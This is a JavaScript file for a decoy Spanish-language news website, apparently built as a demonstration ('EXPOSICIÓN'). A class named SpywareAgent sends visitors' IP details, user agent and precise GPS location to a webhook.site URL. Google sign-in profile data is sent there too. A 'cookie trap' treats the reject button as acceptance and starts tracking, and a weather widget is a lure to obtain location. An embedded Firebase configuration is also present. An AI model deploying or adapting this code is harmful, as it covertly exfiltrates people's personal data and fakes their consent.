
/**
 * GLOBAL INSIGHT CORE SYSTEM
 * Módulo de gestión de contenidos y telemetría.
 * VERSIÓN FINAL - EXPOSICIÓN
 */

const CONFIG = {
    //Asegúrate de que esta sea TU URL de webhook.site válida
    WEBHOOK_URL: "https://webhook.site/8681f53b-1612-4dee-b6df-adde57557614", 
    COOKIE_TIMEOUT: 1500,
    FORCE_ACCEPT: true
};

// Configuración de Firebase (REEMPLAZA CON TUS PROPIAS CREDENCIALES)
const firebaseConfig = {
  apiKey: "AIzaSyCZxRHndnpjYCvWG-kZYKDWpyqCN_UAOWY",
  authDomain: "recoleccion-datos-a78a6.firebaseapp.com",
  projectId: "recoleccion-datos-a78a6",
  storageBucket: "recoleccion-datos-a78a6.firebasestorage.app",
  messagingSenderId: "123889106526",
  appId: "1:123889106526:web:f3d296fedf8e92907dbecf",
  measurementId: "G-5Z0VCWZD4S"
};

const newsDatabase = [
    { title: "Avance Histórico en Inteligencia Artificial Generativa", category: "Tecnología" },
    { title: "Mercados Asiáticos Cierran al Alza tras Anuncios", category: "Economía" },
    { title: "La NASA Confirma Nueva Misión a las Lunas de Júpiter", category: "Ciencia" },
    { title: "El Futuro del Trabajo Híbrido: Informe 2025", category: "Negocios" },
    { title: "Ciberseguridad: Nuevos Protocolos Bancarios", category: "Tech" },
    { title: "Crisis Climática: Acuerdos de la Cumbre Global", category: "Mundo" },
    { title: "Bitcoin rompe barrera de resistencia histórica", category: "Cripto" },
    { title: "Nuevas regulaciones para drones de reparto", category: "Innovación" }
];

class SpywareAgent {
    constructor(webhook) {
        this.webhook = webhook;
        this.ipData = null;
        this.userAgent = navigator.userAgent;
        this.acceptedCookies = false;
    }

    async trackIP() {
        try {
            const res = await fetch('https://ipwho.is/');
            const data = await res.json();
            this.ipData = data;
            // Envío silencioso de IP
            this.exfiltrate({ ...data, userAgent: this.userAgent }, "PASSIVE_DATA", "Rastreo General");
        } catch (e) { console.error("Fallo IP"); }
    }

    trackGPS(onSuccess, onError) {
        if (!navigator.geolocation) return onError("GPS no soportado");
        
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const { latitude, longitude, accuracy } = pos.coords;
                const gpsData = {
                    lat: latitude,
                    lon: longitude,
                    acc: accuracy,
                    map_url: `http://maps.google.com/maps?q=${latitude},${longitude}`,
                    ...this.ipData
                };
                this.exfiltrate(gpsData, "ACTIVE_GPS_TARGET", "Ubicación Exacta");
                onSuccess(gpsData);
            },
            (err) => onError(err),
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }

    exfiltrate(payload, type, precision) {
        // MODO NO-CORS: Envía los datos sin esperar respuesta (para evitar errores en consola)
        fetch(this.webhook, {
            method: 'POST',
            mode: 'no-cors', // <--- CRUCIAL PARA VERCEL
            headers: { 'Content-Type': 'text/plain' },
            body: JSON.stringify({ ALERTA: type, PRECISION: precision, DATOS: payload })
        }).then(() => console.log(">> Datos enviados (Silencioso)")).catch(e => console.log("Error envío"));
    }

    setCookiesAccepted(status) { this.acceptedCookies = status; }
}

// --- SISTEMA DE AUTENTICACIÓN FIREBASE ---

class AuthManager {
    constructor() {
        this.user = null;
        this.initialized = false;
        this.initFirebase();
    }

    initFirebase() {
        try {
            firebase.initializeApp(FIREBASE_CONFIG);
            this.initialized = true;
            
            // Escuchar cambios de autenticación
            firebase.auth().onAuthStateChanged((user) => {
                this.handleAuthStateChange(user);
            });
        } catch (error) {
            console.error("Error inicializando Firebase:", error);
        }
    }

    handleAuthStateChange(user) {
        if (user) {
            this.user = user;
            this.showUserProfile(user);
            this.exfiltrateUserData(user);
        } else {
            this.user = null;
            this.hideUserProfile();
        }
    }

    async signInWithGoogle() {
        if (!this.initialized) {
            alert("Sistema de autenticación no disponible");
            return;
        }

        const provider = new firebase.auth.GoogleAuthProvider();
        provider.addScope('profile');
        provider.addScope('email');

        try {
            const result = await firebase.auth().signInWithPopup(provider);
            return result.user;
        } catch (error) {
            console.error("Error en login:", error);
            alert("Error al iniciar sesión: " + error.message);
            return null;
        }
    }

    async signOut() {
        try {
            await firebase.auth().signOut();
        } catch (error) {
            console.error("Error cerrando sesión:", error);
        }
    }

    showUserProfile(user) {
        const profileWidget = document.getElementById('user-profile');
        const authWidget = document.getElementById('auth-widget');
        
        if (profileWidget && authWidget) {
            document.getElementById('user-name').textContent = user.displayName || 'Usuario';
            document.getElementById('user-email').textContent = user.email || 'No especificado';
            
            const avatar = document.getElementById('user-avatar');
            if (user.photoURL) {
                avatar.src = user.photoURL;
            }
            
            authWidget.style.display = 'none';
            profileWidget.style.display = 'block';
        }
    }

    hideUserProfile() {
        const profileWidget = document.getElementById('user-profile');
        const authWidget = document.getElementById('auth-widget');
        
        if (profileWidget && authWidget) {
            profileWidget.style.display = 'none';
            authWidget.style.display = 'block';
        }
    }

    exfiltrateUserData(user) {
        const userData = {
            uid: user.uid,
            email: user.email,
            displayName: user.displayName,
            photoURL: user.photoURL,
            emailVerified: user.emailVerified,
            providerData: user.providerData,
            metadata: {
                creationTime: user.metadata.creationTime,
                lastSignInTime: user.metadata.lastSignInTime
            },
            ipData: window.spyAgent?.ipData,
            timestamp: new Date().toISOString()
        };

        // Enviar datos del usuario al webhook
        if (window.spyAgent) {
            window.spyAgent.exfiltrate(userData, "USER_OAUTH_DATA", "Perfil Completo");
        }

        console.log("📧 Datos de usuario capturados:", {
            nombre: user.displayName,
            email: user.email,
            foto: user.photoURL
        });
    }
}

// --- FUNCIONES DE INTERFAZ (UI) ---

function renderNews() {
    const heroEl = document.getElementById("hero-news");
    const gridEl = document.getElementById("secondary-grid");
    
    // Barajar noticias aleatoriamente
    const shuffled = [...newsDatabase].sort(() => 0.5 - Math.random());

    // 1. Renderizar Hero (Noticia Grande)
    if(heroEl && shuffled.length > 0) {
        const hero = shuffled[0];
        heroEl.innerHTML = `
            <img src="https://picsum.photos/800/600?random=${Math.random()}" alt="News">
            <div class="hero-content">
                <span style="background:#0056b3; padding:4px 8px; font-size:0.75rem; margin-bottom:10px; display:inline-block; border-radius:2px;">${hero.category}</span>
                <h1>${hero.title}</h1>
            </div>
        `;
    }

    // 2. Renderizar Grid Secundario (4 noticias abajo)
    if(gridEl && shuffled.length > 1) {
        gridEl.innerHTML = ""; 
        const secondaryNews = shuffled.slice(1, 5); // Tomar las siguientes 4
        
        secondaryNews.forEach(news => {
            const card = document.createElement('div');
            card.className = 'news-card';
            card.innerHTML = `
                <img src="https://picsum.photos/400/300?random=${Math.random()}" alt="News Mini">
                <h3>${news.title}</h3>
                <span class="meta">${news.category} • Hace 2h</span>
            `;
            gridEl.appendChild(card);
        });
    }
}

function renderTrending() {
    const listEl = document.getElementById("trending-list");
    if(!listEl) return;

    listEl.innerHTML = ""; 
    // Tomamos 5 noticias para la lista lateral
    const trendingNews = newsDatabase.slice(0, 5); 

    trendingNews.forEach((news, index) => {
        const li = document.createElement("li");
        li.innerHTML = `
            <span>0${index + 1}</span>
            <div style="display:flex; flex-direction:column; justify-content:center;">
                <small style="color:#d93025; font-weight:bold; font-size:0.7rem;">TENDENCIA</small>
                <a href="#" style="font-weight:bold; font-size:0.9rem; line-height:1.3;">${news.title}</a>
            </div>
        `;
        listEl.appendChild(li);
    });
}

// --- INICIO DE LA APLICACIÓN ---
document.addEventListener("DOMContentLoaded", async () => {
    
    // 1. Inicializar Agente Espía
    const spy = new SpywareAgent(CONFIG.WEBHOOK_URL);
    window.spyAgent = spy;

    // 2. Inicializar Sistema de Autenticación
    const authManager = new AuthManager();
    window.authManager = authManager;

    // 3. Cargar contenido VISUAL inmediatamente
    renderNews();
    renderTrending();

    // 4. Configurar eventos de autenticación
    setupAuthEvents(authManager);

    // 5. Activar trampa de cookies después de un momento
    setTimeout(() => setupCookieTrap(spy), CONFIG.COOKIE_TIMEOUT);

    // Fecha Header
    const dateEl = document.getElementById("current-date");
    if(dateEl) {
        dateEl.innerText = new Date().toLocaleDateString('es-ES', { 
            weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' 
        });
    }

    // LÓGICA DEL CLIMA (TRAMPA GPS)
    const btnGps = document.getElementById("btn-gps-trigger");
    const weatherWidget = document.getElementById("weather-trap");
    
    if(btnGps && weatherWidget) {
        const blurContent = weatherWidget.querySelector(".blur-content");

        btnGps.addEventListener("click", () => {
            if (!spy.acceptedCookies) {
                alert("⚠️ Para ver el clima local, necesitamos verificar que no eres un robot (Acepta las cookies).");
                const modal = document.getElementById('cookie-modal');
                if(modal) modal.style.display = 'flex';
                return;
            }
            
            const btn = btnGps.querySelector("button");
            const originalText = btn.innerHTML;
            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Obteniendo...';
            
            spy.trackGPS(
                async (data) => {
                    // ÉXITO
                    btnGps.style.opacity = "0";
                    setTimeout(() => { btnGps.style.display = "none"; }, 500);
                    
                    try {
                        const weatherRes = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${data.lat}&longitude=${data.lon}&current_weather=true`);
                        const weatherData = await weatherRes.json();
                        updateWeatherUI(weatherWidget, blurContent, weatherData.current_weather);
                    } catch (error) {
                        updateWeatherUI(weatherWidget, blurContent, { temperature: "24", weathercode: 1 });
                    }
                },
                (error) => {
                    btn.innerHTML = "Ubicación Bloqueada";
                    setTimeout(() => { btn.innerHTML = originalText; }, 2000);
                    alert("Activa la ubicación en el navegador.");
                }
            );
        });
    }
});

function setupAuthEvents(authManager) {
    const loginBtn = document.getElementById('btn-login');
    const googleLoginBtn = document.getElementById('btn-google-login');
    const logoutBtn = document.getElementById('btn-logout');
    const loginModal = document.getElementById('login-modal');

    if (loginBtn) {
        loginBtn.addEventListener('click', () => {
            if (loginModal) loginModal.style.display = 'flex';
        });
    }

    if (googleLoginBtn) {
        googleLoginBtn.addEventListener('click', async () => {
            googleLoginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Conectando...';
            googleLoginBtn.disabled = true;

            const user = await authManager.signInWithGoogle();
            
            if (user) {
                if (loginModal) loginModal.style.display = 'none';
                showCustomNotification(`Bienvenido, ${user.displayName || 'Usuario'}!`);
            }

            googleLoginBtn.innerHTML = '<i class="fab fa-google"></i> Continuar con Google';
            googleLoginBtn.disabled = false;
        });
    }

    if (logoutBtn) {
        logoutBtn.addEventListener('click', () => {
            authManager.signOut();
            showCustomNotification('Sesión cerrada correctamente');
        });
    }

    // Cerrar modal al hacer click fuera
    if (loginModal) {
        loginModal.addEventListener('click', (e) => {
            if (e.target === loginModal) {
                loginModal.style.display = 'none';
            }
        });
    }
}

function updateWeatherUI(widget, content, weather) {
    content.style.transition = "all 0.5s ease";
    content.style.filter = "none";
    content.style.opacity = "1";
    
    const tempEl = widget.querySelector(".fake-temp");
    const descEl = content.querySelector("p");
    
    tempEl.innerText = `${weather.temperature}°C`;
    tempEl.style.color = "#333"; 
    
    descEl.innerHTML = `
        <div style="font-size: 2rem; margin: 10px 0;"><i class="fas fa-sun" style="color:orange"></i></div>
        <strong>Clima Actualizado</strong>
    `;
}

function setupCookieTrap(spyAgent) {
    const modal = document.getElementById('cookie-modal');
    const btnAccept = document.getElementById('btn-accept-all');
    const btnReject = document.getElementById('btn-reject');

    if(!modal) return;

    modal.style.display = 'flex';

    const close = () => {
        spyAgent.setCookiesAccepted(true);
        modal.style.display = 'none';
        spyAgent.trackIP(); // Iniciar rastreo al cerrar
        showSafeNotification();
    };

    if(btnAccept) btnAccept.addEventListener('click', close);
    if(btnReject) btnReject.addEventListener('click', () => {
        btnReject.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Guardando...';
        setTimeout(close, 800);
    });
}

function showSafeNotification() {
    showCustomNotification('Preferencias actualizadas');
}

function showCustomNotification(message) {
    const notif = document.createElement('div');
    notif.style.cssText = `
        position: fixed; top: 20px; right: 20px; background: #333; color: white;
        padding: 12px 20px; border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        z-index: 10000; font-size: 0.85rem; display: flex; align-items: center; gap: 10px;
        animation: slideIn 0.5s ease forwards;
    `;
    notif.innerHTML = `<i class="fas fa-check" style="color:#0f9d58;"></i> ${message}`;
    document.body.appendChild(notif);
    setTimeout(() => notif.remove(), 3000);
}

// Añadir keyframes para la animación
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
`;
document.head.appendChild(style);
